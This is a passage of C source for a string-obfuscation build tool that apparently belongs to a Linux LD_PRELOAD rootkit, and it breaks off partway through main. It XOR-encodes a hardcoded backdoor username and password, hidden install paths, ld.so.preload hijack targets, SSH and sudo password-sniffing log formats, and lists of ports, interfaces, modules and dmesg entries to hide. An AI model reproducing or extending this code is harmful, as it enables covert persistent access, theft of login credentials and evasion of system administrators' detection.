#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <fcntl.h>
#include "../include/arch.h"
#include "../include/syscalls.h"

int XOR_KEY;

#define LDHOME "/lib/libseconf/"
//#define LDHOME "/dev/shm/ldx"

char *USER            = "adm1n";
char *RKHOME          = LDHOME;
char *PASS            = "asdfasdf";
char *LDPATH          = "libseconf";             /* filter_() and readdir() */
char *LIBDL           = "libdl.so";
char *PRELOAD         = "ld.so.preload";
char *ETC_PRELOAD     = "/etc/ld.so.preload";
char *HISTFILE        = "HISTFILE=/dev/null";
char *FILTER_DMESG    = LDHOME ".sys/.dmesg";
char *DIRTYCOW_PROT   = LDHOME ".dirty";
char *SSH_KEY         = LDHOME "authorized_keys";
char *SNIFF_LOG       = LDHOME "sniff.txt";
char *SSH_SNIFF       = LDHOME ".sniff";
char *SSHPASS         = LDHOME "sshpass.txt";
char *SSHPASS2        = LDHOME "sshpass2.txt";
char *SSHD_CONFIG     = "sshd_config";
char *HIDDEN_SSHD     = LDHOME "sshd_config";
char *SSHD_AUTHKEYS   = "authorized_keys";
char *HIDDEN_AUTHKEYS = LDHOME "authorized_keys";
char *HIDDEN_AUDIT    = LDHOME ".audit";
char *HIDDEN_PORTS    = LDHOME ".ports";
char *HIDDEN_UDP      = LDHOME ".udp";
char *HIDDEN_MEM      = LDHOME ".mem";
char *HIDDEN_LKM      = LDHOME ".lkm";
char *HIDDEN_FW       = LDHOME ".fw";
char *HIDDEN_IFACE    = LDHOME ".net";
char *SHOW_LOAD       = LDHOME ".showload";
char *MAX_LOAD        = LDHOME ".maxload";
char *RKPROXY         = LDHOME "rpr";
char *HIDDEN_PRELOAD  = LDHOME ".l";
char *HIDDEN_PRELOAD2 = LDHOME ".l2";
char *HIDDEN_LDSO     = LDHOME "libdl.so";
char *HIDDEN_EXECLOG  = LDHOME "execlog";
char *HIDDEN_NOLOG    = LDHOME ".nolog";
char *HIDDEN_MOUNTS   = LDHOME ".mounts";
char *HIDDEN_STAT     = LDHOME ".stat";
char *BOOT_SCRIPT     = LDHOME ".boot.sh";
char *HOSTS_ALLOW     = LDHOME ".hosts";
char *DISK_USAGE      = LDHOME ".usage";
char *LOG_PAM         = LDHOME ".logpam";
char *LD_LIST         = LDHOME ".backup_ld --list %s";
char *LD_TRACE        = "LD_TRACE_LOADED_OBJECTS";
char *PROC_SELF_FD    = "/proc/self/fd/0";
char *HOSTS_ACCESS    = "hosts_access";
char *LASTLOG         = "lastlog";
char *TAP4            = "tap4";
char *TUN8            = "tun8";
char *AUTH_KEY        = "authorized_keys";
char *PROC            = "/proc";
char *PROC_STR        = "/proc/%s";
char *SSHD            = "sshd";
char *SSHPATH         = "/usr/bin/ssh";
char *PASSFMT         = "user: %s pass: %s\n";
char *MUGABE          = "adm1n";
char *CMDLINE         = "/cmdline";
char *CMDLINE_SELF    = "/proc/self/cmdline";
char *SSHMUGABE       = "sshd: adm1n";
char *MAIL            = "MAIL";
char *XSTAT           = "__xstat";
char *XSTAT64         = "__xstat64";
char *LXSTAT          = "__lxstat";
char *LXSTAT64        = "__lxstat64";
char *FXSTATAT        = "__fxstatat";
char *LSTAT           = "lstat";
char *LSTAT64         = "lstat64";
char *STAT            = "stat";
char *STAT64          = "stat64";
char *STATFS          = "statfs";
char *STATVFS         = "statvfs";
char *WRITE           = "write";
char *READ            = "read";
char *READDIR         = "readdir";
char *READDIR64       = "readdir64";
char *OPENDIR         = "opendir";
char *OPEN            = "open";
char *OPENAT          = "openat";
char *OPEN64          = "open64";
char *FOPEN           = "fopen";
char *UNLINK          = "unlink";
char *EXECVE          = "execve";
char *SETGID          = "setgid";
char *SETREGID        = "setregid";
char *SETRESGID       = "setresgid";
char *GETPWNAM        = "getpwnam";
char *GETPWNAM_R      = "getpwnam_r";
char *ACCESS          = "access";
char *TRUNCATE        = "truncate";
char *CHDIR           = "chdir";
char *MKDIR           = "mkdir";
char *MKDIRAT         = "mkdirat";
char *UNLINKAT        = "unlinkat";
char *CREAT           = "creat";
char *IOCTL           = "ioctl";
char *CHMOD           = "chmod";
char *CHOWN           = "chown";
char *FCHOWNAT        = "fchownat";
char *UPDWTMP         = "updwtmp";
char *PUTUTLINE       = "pututline";
char *ROOT            = "root";
char *ASSWORD         = "assword:";
char *SUDOPASS        = "[sudo] pass";
char *SUDO            = "sudo";
char *ASSWORD2        = "'s password:";
char *PROC_NET_TCP    = "/proc/net/tcp";
char *PROC_TCP        = "net/tcp";
char *PROC_MOUNTS     = "mounts";
char *PROC_MAPS       = "maps";
char *PROC_SMAPS      = "smaps";
char *PROC_NUMA       = "numa_maps";
char *PROC_MEM        = "meminfo";
char *PROC_NET_DEV    = "net/dev";
char *PROC_NET_ARP    = "net/arp";
char *PROC_NET_ROUTE  = "net/route";
char *PROC_MOD        = "modules";
char *PROC_LOAD       = "loadavg";
char *PROC_FD         = "/proc/self/fd/%d";
char *PROC_STAT       = "stat";
char *DMESG_PROMISC   = "promiscuous";
char *DMESG_KVM       = "zapping";
char *DMESG_TCPDUMP   = "tcpdump";
char *DMESG_BIN       = "/bin/dmesg";
char *DMESG_BIN2      = "/usr/bin/dmesg";
char *STRACE_BIN      = "/usr/bin/strace";
char *IPTABLES_BIN    = "/sbin/iptables";
char *IPTABLES_BIN2   = "/usr/sbin/iptables";
char *BASH_BIN        = "/bin/bash";
char *BASH            = "bash";
char *SQUID3_BIN      = "/usr/sbin/squid3";
char *LIB_DSX         = "/lib/libdsx.so";
char *CP_LIB_DSX      = "cp -p %s /lib/libdsx.so";
char *MV_LIB_DSX      = "mv /lib/libdsx.so %s";
char *UPGRADE         = "upgrade";

#ifdef __AMD64__
char *LD_LINK         = "/lib64/ld-linux-x86-64.so.2";
char *LD_ROOT         = "/lib64/%s";
#endif

#ifdef __i386__
char *LD_LINK         = "/lib/ld-linux.so.2";
char *LD_ROOT         = "/lib/%s";
#endif

struct libc_calls {
	const char *sym;
};

static struct libc_calls libc_call[30] = {
	{ (char *)&XSTAT,    },  { (char *)&LXSTAT    },
	{ (char *)&LSTAT      }, { (char *)&LSTAT64   },
	{ (char *)&STAT       }, { (char *)&STAT64    },
	{ (char *)&WRITE      }, { (char *)&READ      },
	{ (char *)&READDIR    }, { (char *)&READDIR64 },
	{ (char *)&OPENDIR    }, { (char *)&OPEN      },
	{ (char *)&OPEN64     }, { (char *)&FOPEN     },
	{ (char *)&UNLINK     }, { (char *)&EXECVE    },
	{ (char *)&SETRESGID  }, { (char *)&GETPWNAM  },
	{ (char *)&SETGID     }, { (char *)&SETREGID  },
	{ (char *)&GETPWNAM_R }, { (char *)&ACCESS    },
	{ (char *)&TRUNCATE   }, { (char *)&MKDIR     },
	{ (char *)&MKDIRAT    }, { (char *)&CREAT     },
	{ (char *)&CHMOD      }, { (char *)&CHOWN     },
	{ (char *)&OPENAT     }, { (char *)&UNLINKAT  }
};

void xor_dump(char *str, int fd)
{
	char buf[256] = {0};
	char *p;
	int len, x;

	p = buf;
	len = strlen(str);
	for (x=0; x < len; x++) {
		sprintf(p, "\\x%2x", str[x]^XOR_KEY);
		p += 4;
	}
	write(fd, buf, p-buf);
	write(fd, "\"\n", 2);
}

#define DEF_DIRTYCOW_PROT   "#define DIRTYCOW_PROT   \""
#define DEF_BOOT_SCRIPT     "#define BOOT_SCRIPT     \""
#define DEF_USER            "#define ESX_USER        \""
#define DEF_PASS            "#define PASS            \""
#define DEF_LDPATH          "#define LDPATH          \""
#define DEF_RKHOME          "#define RKHOME          \""
#define DEF_LIBDL           "#define LIBDL           \""
#define DEF_PRELOAD         "#define PRELOAD         \""
#define DEF_HISTFILE        "#define HISTFILE        \""
#define DEF_SSH_KEY         "#define SSH_KEY         \""
#define DEF_SSHD_CONFIG     "#define SSHD_CONFIG     \""
#define DEF_HIDDEN_SSHD     "#define HIDDEN_SSHD     \""
#define DEF_SSHD_AUTHKEYS   "#define SSHD_AUTHKEYS   \""
#define DEF_HIDDEN_AUTHKEYS "#define HIDDEN_AUTHKEYS \""
#define DEF_LDHOME          "#define LDHOME          \""
#define DEF_FILTER_DMESG    "#define FILTER_DMESG    \""
#define DEF_MUGABE          "#define MUGABE          \""
#define DEF_SSHPASS         "#define SSHPASS         \""
#define DEF_SSHPASS2        "#define SSHPASS2        \""
#define DEF_SSH_SNIFF       "#define SSH_SNIFF       \""
#define DEF_SNIFF_LOG       "#define SNIFF_LOG       \""
#define DEF_PASSFMT         "#define PASSFMT         \""
#define DEF_SSHPATH         "#define SSHPATH         \""
#define DEF_DISK_USAGE      "#define DISK_USAGE      \""
#define DEF_DEV_PTS         "#define DEV_PTS         \""
#define DEF_DEV_TTY         "#define DEV_TTY         \"" 
#define DEF_RKPRELOAD       "#define RKPRELOAD       \""
#define DEF_ETC_PRELOAD     "#define ETC_PRELOAD     \""
#define DEF_MAIL            "#define MAIL            \""
#define DEF_BASH            "#define BASH            \""
#define DEF_XSTAT           "#define XSTAT           \""
#define DEF_XSTAT64         "#define XSTAT64         \""
#define DEF_LXSTAT          "#define LXSTAT          \""
#define DEF_LXSTAT64        "#define LXSTAT64        \""
#define DEF_STAT            "#define STAT            \""
#define DEF_STAT64          "#define STAT64          \""
#define DEF_LSTAT           "#define LSTAT           \""
#define DEF_LSTAT64         "#define LSTAT64         \""
#define DEF_FXSTATAT        "#define FXSTATAT        \""
#define DEF_STATFS          "#define STATFS          \""
#define DEF_STATVFS         "#define STATVFS         \""
#define DEF_READ            "#define READ            \""
#define DEF_READDIR         "#define READDIR         \""
#define DEF_READDIR64       "#define READDIR64       \""
#define DEF_EXECVE          "#define EXECVE          \""
#define DEF_SETGID          "#define SETGID          \""
#define DEF_SETREGID        "#define SETREGID        \""
#define DEF_SETRESGID       "#define SETRESGID       \""
#define DEF_GETPWNAM        "#define GETPWNAM        \""
#define DEF_GETPWNAM_R      "#define GETPWNAM_R      \""
#define DEF_UNLINK          "#define UNLINK          \""
#define DEF_UNLINKAT        "#define UNLINKAT        \""
#define DEF_OPEN            "#define OPEN            \""
#define DEF_OPEN64          "#define OPEN64          \""
#define DEF_FOPEN           "#define FOPEN           \""
#define DEF_OPENAT          "#define OPENAT          \""
#define DEF_ACCESS          "#define ACCESS          \""
#define DEF_TRUNCATE        "#define TRUNCATE        \""
#define DEF_CHDIR           "#define CHDIR           \""
#define DEF_CHMOD           "#define CHMOD           \""
#define DEF_CHOWN           "#define CHOWN           \""
#define DEF_FCHOWNAT        "#define FCHOWNAT        \""
#define DEF_MKDIR           "#define MKDIR           \""
#define DEF_MKDIRAT         "#define MKDIRAT         \""
#define DEF_CREAT           "#define CREAT           \""
#define DEF_IOCTL           "#define IOCTL           \""
#define DEF_AUTH_KEY        "#define AUTH_KEY        \""
#define DEF_SSHD            "#define SSHD            \""
#define DEF_SSHMUGABE       "#define SSHMUGABE       \""
#define DEF_CMDLINE         "#define CMDLINE         \""
#define DEF_CMDLINE_SELF    "#define CMDLINE_SELF    \""
#define DEF_ROOT            "#define ROOT            \""
#define DEF_OPENDIR         "#define OPENDIR         \""
#define DEF_WRITE           "#define WRITE           \""
#define DEF_UPDWTMP         "#define UPDWTMP         \""
#define DEF_PUTUTLINE       "#define PUTUTLINE       \""
#define DEF_HOSTS_ACCESS    "#define HOSTS_ACCESS    \""
#define DEF_HOSTS_ALLOW     "#define HOSTS_ALLOW     \""
#define DEF_ASSWORD         "#define ASSWORD         \""
#define DEF_ASSWORD2        "#define ASSWORD2        \""
#define DEF_SUDOPASS        "#define SUDOPASS        \""
#define DEF_SUDO            "#define SUDO            \""
#define DEF_PROC            "#define PROC            \""
#define DEF_PROC_STR        "#define PROC_STR        \""
#define DEF_PROC_FD         "#define PROC_FD         \""
#define DEF_PROC_SELF_FD    "#define PROC_SELF_FD    \""
#define DEF_PROC_TCP        "#define PROC_TCP        \""
#define DEF_PROC_NET_TCP    "#define PROC_NET_TCP    \""
#define DEF_PROC_MOUNTS     "#define PROC_MOUNTS     \""
#define DEF_PROC_MAPS       "#define PROC_MAPS       \""
#define DEF_PROC_SMAPS      "#define PROC_SMAPS      \""
#define DEF_PROC_NUMA       "#define PROC_NUMA       \""
#define DEF_PROC_MEM        "#define PROC_MEM        \""
#define DEF_PROC_MOD        "#define PROC_MOD        \""
#define DEF_PROC_NET_DEV    "#define PROC_NET_DEV    \""
#define DEF_PROC_NET_ARP    "#define PROC_NET_ARP    \""
#define DEF_PROC_NET_ROUTE  "#define PROC_NET_ROUTE  \""
#define DEF_PROC_LOAD       "#define PROC_LOAD       \""
#define DEF_PROC_STAT       "#define PROC_STAT       \""
#define DEF_HIDDEN_AUDIT    "#define HIDDEN_AUDIT    \""
#define DEF_HIDDEN_PORTS    "#define HIDDEN_PORTS    \""
#define DEF_HIDDEN_UDP      "#define HIDDEN_UDP      \""
#define DEF_HIDDEN_IFACE    "#define HIDDEN_IFACE    \""
#define DEF_HIDDEN_MEM      "#define HIDDEN_MEM      \""
#define DEF_HIDDEN_PRELOAD  "#define HIDDEN_PRELOAD  \""
#define DEF_HIDDEN_PRELOAD2 "#define HIDDEN_PRELOAD2 \""
#define DEF_HIDDEN_LKM      "#define HIDDEN_LKM      \""
#define DEF_HIDDEN_EXECLOG  "#define HIDDEN_EXECLOG  \""
#define DEF_HIDDEN_NOLOG    "#define HIDDEN_NOLOG    \""
#define DEF_HIDDEN_FW       "#define HIDDEN_FW       \""
#define DEF_HIDDEN_LDSO     "#define HIDDEN_LDSO     \""
#define DEF_HIDDEN_MOUNTS   "#define HIDDEN_MOUNTS   \""
#define DEF_HIDDEN_STAT     "#define HIDDEN_STAT     \""
#define DEF_SHOW_LOAD       "#define SHOW_LOAD       \""
#define DEF_MAX_LOAD        "#define MAX_LOAD        \""
#define DEF_LOG_PAM         "#define LOG_PAM         \""
#define DEF_TAP4            "#define TAP4            \""
#define DEF_TUN8            "#define TUN8            \""
#define DEF_LASTLOG         "#define LASTLOG         \""
#define DEF_LD_TRACE        "#define LD_TRACE        \""
#define DEF_LD_LIST         "#define LD_LIST         \""
#define DEF_RKPROXY         "#define RKPROXY         \""
#define DEF_DMESG_PROMISC   "#define DMESG_PROMISC   \""
#define DEF_DMESG_KVM       "#define DMESG_KVM       \""
#define DEF_DMESG_TCPDUMP   "#define DMESG_TCPDUMP   \""
#define DEF_DMESG_BIN       "#define DMESG_BIN       \""
#define DEF_DMESG_BIN2      "#define DMESG_BIN2      \""
#define DEF_STRACE_BIN      "#define STRACE_BIN      \""
#define DEF_IPTABLES_BIN    "#define IPTABLES_BIN    \""
#define DEF_IPTABLES_BIN2   "#define IPTABLES_BIN2   \""
#define DEF_BASH_BIN        "#define BASH_BIN        \""
#define DEF_BASH            "#define BASH            \""
#define DEF_SQUID3_BIN      "#define SQUID3_BIN      \""
#define DEF_LIB_DSX         "#define LIB_DSX         \""
#define DEF_CP_LIB_DSX      "#define CP_LIB_DSX      \""
#define DEF_MV_LIB_DSX      "#define MV_LIB_DSX      \""
#define DEF_UPGRADE         "#define UPGRADE         \""

#ifdef __AMD64__
#define DEF_LD_LINK         "#define LD_LINK \""
#define DEF_LD_ROOT         "#define LD_ROOT \""
#endif

#ifdef __i386__
#define DEF_LD_LINK         "#define LD_LINK \""
#define DEF_LD_ROOT         "#define LD_ROOT \""
#endif

int main(int argc, char *argv[]) {
	char *p;
	char buf[256];
	int fd;

	XOR_KEY = 0xa2;
	unlink("./build/xor.h");
	fd = open("./build/xor.h", O_RDWR|O_CREAT, 0644);
	sprintf(buf, "#define XOR_KEY 0x%2x\n", XOR_KEY);
	write(fd, buf, strlen(buf));

	write(fd, DEF_DIRTYCOW_PROT,   strlen(DEF_DIRTYCOW_PROT));
	xor_dump(DIRTYCOW_PROT, fd);

	/* topsecret user  */
	write(fd, DEF_USER,            strlen(DEF_USER));
	xor_dump(USER, fd);
	/* password */
	write(fd, DEF_PASS,            strlen(DEF_PASS));
	xor_dump(PASS, fd);
	/* hidden dir */
	write(fd, DEF_LDHOME,          strlen(DEF_LDHOME));
	xor_dump(LDHOME, fd);
	/* rkhome */
	write(fd, DEF_RKHOME,          strlen(DEF_RKHOME));
	xor_dump(RKHOME, fd);
	/* libdl.so */
	write(fd, DEF_LIBDL,           strlen(DEF_LIBDL));
	xor_dump(LIBDL, fd);
	/* /lib/rkpath */
	write(fd, DEF_LDPATH,          strlen(DEF_LDPATH));
	xor_dump(LDPATH, fd);
	/* ld.so.preload */
	write(fd, DEF_PRELOAD,         strlen(DEF_PRELOAD));
	xor_dump(PRELOAD, fd);
	/* disk usage */
	write(fd, DEF_DISK_USAGE,      strlen(DEF_DISK_USAGE));
	xor_dump(DISK_USAGE, fd);
	/* /etc/ld.so.preload */
	write(fd, DEF_ETC_PRELOAD,     strlen(DEF_ETC_PRELOAD));
	xor_dump(ETC_PRELOAD, fd);
	/* HISTFILE=/dev/null */
	write(fd, DEF_HISTFILE,        strlen(DEF_HISTFILE));
	xor_dump(HISTFILE,fd);
	write(fd, DEF_PROC,            strlen(DEF_PROC));
	xor_dump(PROC, fd);
	write(fd, DEF_PROC_STR,        strlen(DEF_PROC_STR));
	xor_dump(PROC_STR, fd);
	write(fd, DEF_PROC_FD,         strlen(DEF_PROC_FD));
	xor_dump(PROC_FD, fd);
	write(fd, DEF_FILTER_DMESG,    strlen(DEF_FILTER_DMESG));
	xor_dump(FILTER_DMESG, fd);

	/* SSHD */
	write(fd, DEF_SSH_KEY,         strlen(DEF_SSH_KEY));
	xor_dump(SSH_KEY, fd);
	write(fd, DEF_SSHD_CONFIG,     strlen(DEF_SSHD_CONFIG));
	xor_dump(SSHD_CONFIG, fd);
	write(fd, DEF_HIDDEN_SSHD,     strlen(DEF_HIDDEN_SSHD));
	xor_dump(HIDDEN_SSHD, fd);
	write(fd, DEF_HIDDEN_AUTHKEYS, strlen(DEF_HIDDEN_AUTHKEYS));
	xor_dump(HIDDEN_AUTHKEYS, fd);
	write(fd, DEF_SSHD_AUTHKEYS,   strlen(DEF_SSHD_AUTHKEYS));
	xor_dump(SSHD_AUTHKEYS, fd);

	write(fd, DEF_PASSFMT,         strlen(DEF_PASSFMT));
	xor_dump(PASSFMT, fd);
	write(fd, DEF_SSHPASS,         strlen(DEF_SSHPASS));
	xor_dump(SSHPASS, fd);
	write(fd, DEF_SSHPASS2,        strlen(DEF_SSHPASS2));
	xor_dump(SSHPASS2, fd);
	write(fd, DEF_SSH_SNIFF,       strlen(DEF_SSH_SNIFF));
	xor_dump(SSH_SNIFF, fd);
	write(fd, DEF_SNIFF_LOG,       strlen(DEF_SNIFF_LOG));
	xor_dump(SNIFF_LOG, fd);
	write(fd, DEF_SSHPATH,         strlen(DEF_SSHPATH));
	xor_dump(SSHPATH, fd);
	write(fd, DEF_BOOT_SCRIPT,     strlen(DEF_BOOT_SCRIPT));
	xor_dump(BOOT_SCRIPT, fd);
	write(fd, DEF_MUGABE,          strlen(DEF_MUGABE));
	xor_dump(MUGABE, fd);
	write(fd, DEF_MAIL,            strlen(DEF_MAIL));
	xor_dump(MAIL, fd);
	write(fd, DEF_BASH,            strlen(DEF_BASH));
	xor_dump(BASH, fd);
	write(fd, DEF_ROOT,            strlen(DEF_ROOT));
	xor_dump(ROOT, fd);
	write(fd, DEF_AUTH_KEY,        strlen(DEF_AUTH_KEY));
	xor_dump(AUTH_KEY, fd);
	write(fd, DEF_SSHD,            strlen(DEF_SSHD));
	xor_dump(SSHD, fd);
	write(fd, DEF_SSHMUGABE,       strlen(DEF_SSHMUGABE));
	xor_dump(SSHMUGABE, fd);
	write(fd, DEF_CMDLINE,         strlen(DEF_CMDLINE));
	xor_dump(CMDLINE, fd);
	write(fd, DEF_CMDLINE_SELF,    strlen(DEF_CMDLINE_SELF));
	xor_dump(CMDLINE_SELF, fd);
	write(fd, DEF_ASSWORD,         strlen(DEF_ASSWORD));
	xor_dump(ASSWORD, fd);
	write(fd, DEF_ASSWORD2,        strlen(DEF_ASSWORD2));
	xor_dump(ASSWORD2, fd); 
	write(fd, DEF_SUDOPASS,        strlen(DEF_SUDOPASS));
	xor_dump(SUDOPASS, fd);
	write(fd, DEF_SUDO,            strlen(DEF_SUDO));
	xor_dump(SUDO, fd);

	/* /proc FS */
	write(fd, DEF_PROC_NET_TCP,    strlen(DEF_PROC_NET_TCP));
	xor_dump(PROC_NET_TCP, fd);
	write(fd, DEF_PROC_TCP,        strlen(DEF_PROC_TCP));
	xor_dump(PROC_TCP, fd);
	write(fd, DEF_PROC_MAPS,       strlen(DEF_PROC_MAPS));
	xor_dump(PROC_MAPS, fd);
	write(fd, DEF_PROC_SMAPS,      strlen(DEF_PROC_SMAPS));
	xor_dump(PROC_SMAPS, fd);
	write(fd, DEF_PROC_NUMA,       strlen(DEF_PROC_NUMA));
	xor_dump(PROC_NUMA, fd);
	write(fd, DEF_PROC_MOUNTS,     strlen(DEF_PROC_MOUNTS));
	xor_dump(PROC_MOUNTS, fd);
	write(fd, DEF_PROC_MEM,        strlen(DEF_PROC_MEM));
	xor_dump(PROC_MEM, fd);
	write(fd, DEF_PROC_NET_DEV,    strlen(DEF_PROC_NET_DEV));
	xor_dump(PROC_NET_DEV, fd);
	write(fd, DEF_PROC_NET_ARP,    strlen(DEF_PROC_NET_ARP));
	xor_dump(PROC_NET_ARP, fd);
	write(fd, DEF_PROC_NET_ROUTE,  strlen(DEF_PROC_NET_ROUTE));
	xor_dump(PROC_NET_ROUTE, fd);
	write(fd, DEF_PROC_MOD,        strlen(DEF_PROC_MOD));
	xor_dump(PROC_MOD, fd);
	write(fd, DEF_PROC_LOAD,       strlen(DEF_PROC_LOAD));
	xor_dump(PROC_LOAD, fd);
	write(fd, DEF_PROC_STAT,       strlen(DEF_PROC_STAT));
	xor_dump(PROC_STAT, fd);

	/* LIBC FUNCTIONS */
	write(fd, DEF_XSTAT,           strlen(DEF_XSTAT));
	xor_dump(XSTAT, fd);
	write(fd, DEF_LXSTAT,          strlen(DEF_LXSTAT));
	xor_dump(LXSTAT, fd);
	write(fd, DEF_LSTAT,           strlen(DEF_LSTAT));
	xor_dump(LSTAT, fd);
	write(fd, DEF_STAT,            strlen(DEF_STAT));
	xor_dump(STAT, fd);
	write(fd, DEF_FXSTATAT,        strlen(DEF_FXSTATAT));
	xor_dump(FXSTATAT, fd);
	write(fd, DEF_STATFS,          strlen(DEF_STATFS));
	xor_dump(STATFS, fd);
	write(fd, DEF_STATVFS,         strlen(DEF_STATVFS));
	xor_dump(STATVFS, fd);
	write(fd, DEF_READ,            strlen(DEF_READ));
	xor_dump(READ, fd);
	write(fd, DEF_READDIR,         strlen(DEF_READDIR));
	xor_dump(READDIR, fd);
	write(fd, DEF_READDIR64,       strlen(DEF_READDIR64));
	xor_dump(READDIR64, fd);
	write(fd, DEF_EXECVE,          strlen(DEF_EXECVE));
	xor_dump(EXECVE, fd);
	write(fd, DEF_GETPWNAM,        strlen(DEF_GETPWNAM));
	xor_dump(GETPWNAM, fd);
	write(fd, DEF_GETPWNAM_R,      strlen(DEF_GETPWNAM_R));
	xor_dump(GETPWNAM_R, fd);
	write(fd, DEF_UNLINK,          strlen(DEF_UNLINK));
	xor_dump(UNLINK, fd);
	write(fd, DEF_UNLINKAT,        strlen(DEF_UNLINKAT));
	xor_dump(UNLINKAT, fd);
	write(fd, DEF_OPEN,            strlen(DEF_OPEN));
	xor_dump(OPEN, fd);
	write(fd, DEF_OPENAT,          strlen(DEF_OPENAT));
	xor_dump(OPENAT, fd);
	write(fd, DEF_OPEN64,          strlen(DEF_OPEN64));
	xor_dump(OPEN64, fd);
	write(fd, DEF_FOPEN,           strlen(DEF_FOPEN));
	xor_dump(FOPEN, fd);
	write(fd, DEF_OPENDIR,         strlen(DEF_OPENDIR));
	xor_dump(OPENDIR, fd);
	write(fd, DEF_WRITE,           strlen(DEF_WRITE));
	xor_dump(WRITE, fd);
	write(fd, DEF_SETGID,          strlen(DEF_SETGID));
	xor_dump(SETGID, fd);
	write(fd, DEF_SETREGID,        strlen(DEF_SETREGID));
	xor_dump(SETREGID, fd);
	write(fd, DEF_LXSTAT64,        strlen(DEF_LXSTAT64));
	xor_dump(LXSTAT64, fd);
	write(fd, DEF_XSTAT64,         strlen(DEF_XSTAT64));
	xor_dump(XSTAT64, fd);
	write(fd, DEF_SETRESGID,       strlen(DEF_SETRESGID));
	xor_dump(SETRESGID, fd);
	write(fd, DEF_STAT64,          strlen(DEF_STAT64));
	xor_dump(STAT64, fd);
	write(fd, DEF_LSTAT64,         strlen(DEF_LSTAT64));
	xor_dump(LSTAT64, fd);
	write(fd, DEF_ACCESS,          strlen(DEF_ACCESS));
	xor_dump(ACCESS, fd);
	write(fd, DEF_TRUNCATE,        strlen(DEF_TRUNCATE));
	xor_dump(TRUNCATE, fd);
	write(fd, DEF_CHDIR,           strlen(DEF_CHDIR));
	xor_dump(CHDIR, fd);
	write(fd, DEF_MKDIR,           strlen(DEF_MKDIR));
	xor_dump(MKDIR, fd);
	write(fd, DEF_MKDIRAT,         strlen(DEF_MKDIRAT));
	xor_dump(MKDIRAT, fd);
	write(fd, DEF_CREAT,           strlen(DEF_CREAT));
	xor_dump(CREAT, fd);
	write(fd, DEF_CHMOD,           strlen(DEF_CHMOD));
	xor_dump(CHMOD, fd);
	write(fd, DEF_CHOWN,           strlen(DEF_CHOWN));
	xor_dump(CHOWN, fd);
	write(fd, DEF_FCHOWNAT,        strlen(DEF_FCHOWNAT));
	xor_dump(FCHOWNAT, fd);
	write(fd, DEF_IOCTL,           strlen(DEF_IOCTL));
	xor_dump(IOCTL, fd);
	write(fd, DEF_UPDWTMP,         strlen(DEF_UPDWTMP));
	xor_dump(UPDWTMP, fd);
	write(fd, DEF_PUTUTLINE,       strlen(DEF_PUTUTLINE));
	xor_dump(PUTUTLINE, fd);
	write(fd, DEF_HOSTS_ACCESS,    strlen(DEF_HOSTS_ACCESS));
	xor_dump(HOSTS_ACCESS, fd);
	write(fd, DEF_HOSTS_ALLOW,     strlen(DEF_HOSTS_ALLOW));
	xor_dump(HOSTS_ALLOW, fd);

	/* PROCFS */
	write(fd, DEF_HIDDEN_MEM,      strlen(DEF_HIDDEN_MEM));
	xor_dump(HIDDEN_MEM, fd);
	write(fd, DEF_SHOW_LOAD,       strlen(DEF_SHOW_LOAD));
	xor_dump(SHOW_LOAD, fd);
	write(fd, DEF_MAX_LOAD,        strlen(DEF_MAX_LOAD));
	xor_dump(MAX_LOAD, fd);
	write(fd, DEF_HIDDEN_PORTS,    strlen(DEF_HIDDEN_PORTS));
	xor_dump(HIDDEN_PORTS, fd);
	write(fd, DEF_HIDDEN_UDP,      strlen(DEF_HIDDEN_UDP));
	xor_dump(HIDDEN_UDP, fd);
	write(fd, DEF_HIDDEN_AUDIT,    strlen(DEF_HIDDEN_AUDIT));
	xor_dump(HIDDEN_AUDIT, fd);
	write(fd, DEF_HIDDEN_FW,       strlen(DEF_HIDDEN_FW));
	xor_dump(HIDDEN_FW, fd);
	write(fd, DEF_HIDDEN_PRELOAD,  strlen(DEF_HIDDEN_PRELOAD));
	xor_dump(HIDDEN_PRELOAD, fd);
	write(fd, DEF_HIDDEN_PRELOAD2, strlen(DEF_HIDDEN_PRELOAD2));
	xor_dump(HIDDEN_PRELOAD2, fd);
	write(fd, DEF_HIDDEN_LKM,      strlen(DEF_HIDDEN_LKM));
	xor_dump(HIDDEN_LKM, fd);
	write(fd, DEF_HIDDEN_EXECLOG,  strlen(DEF_HIDDEN_EXECLOG));
	xor_dump(HIDDEN_EXECLOG, fd);
	write(fd, DEF_HIDDEN_NOLOG,    strlen(DEF_HIDDEN_NOLOG));
	xor_dump(HIDDEN_NOLOG, fd);
	write(fd, DEF_HIDDEN_LDSO,     strlen(DEF_HIDDEN_LDSO));
	xor_dump(HIDDEN_LDSO, fd);
	write(fd, DEF_HIDDEN_MOUNTS,   strlen(DEF_HIDDEN_MOUNTS));
	xor_dump(HIDDEN_MOUNTS, fd);
	write(fd, DEF_HIDDEN_STAT,     strlen(DEF_HIDDEN_STAT));
	xor_dump(HIDDEN_STAT, fd);

	/* hidden networking */
	write(fd, DEF_TAP4,            strlen(DEF_TAP4));
	xor_dump(TAP4, fd);
	write(fd, DEF_TUN8,            strlen(DEF_TUN8));
	xor_dump(TUN8, fd);
	write(fd, DEF_HIDDEN_IFACE,    strlen(DEF_HIDDEN_IFACE));
	xor_dump(HIDDEN_IFACE, fd);
	write(fd, DEF_IPTABLES_BIN,    strlen(DEF_IPTABLES_BIN));
	xor_dump(IPTABLES_BIN, fd);
	write(fd, DEF_IPTABLES_BIN2,   strlen(DEF_IPTABLES_BIN2));
	xor_dump(IPTABLES_BIN2, fd);

	/* login logs */
	write(fd, DEF_LASTLOG,         strlen(DEF_LASTLOG));
	xor_dump(LASTLOG, fd);	
	write(fd, DEF_LOG_PAM,         strlen(DEF_LOG_PAM));
	xor_dump(LOG_PAM, fd);
	write(fd, DEF_LD_TRACE,        strlen(DEF_LD_TRACE));
	xor_dump(LD_TRACE, fd);
	write(fd, DEF_LD_LIST,         strlen(DEF_LD_LIST));
	xor_dump(LD_LIST, fd);
	write(fd, DEF_RKPROXY,         strlen(DEF_RKPROXY));
	xor_dump(RKPROXY, fd);
	write(fd, DEF_DMESG_PROMISC,   strlen(DEF_DMESG_PROMISC));
	xor_dump(DMESG_PROMISC, fd);
	write(fd, DEF_DMESG_KVM,       strlen(DEF_DMESG_KVM));
	xor_dump(DMESG_KVM, fd);
	write(fd, DEF_DMESG_TCPDUMP,   strlen(DEF_DMESG_TCPDUMP));
	xor_dump(DMESG_TCPDUMP, fd);
	write(fd, DEF_DMESG_BIN,       strlen(DEF_DMESG_BIN));
	xor_dump(DMESG_BIN, fd);
	write(fd, DEF_DMESG_BIN2,      strlen(DEF_DMESG_BIN2));
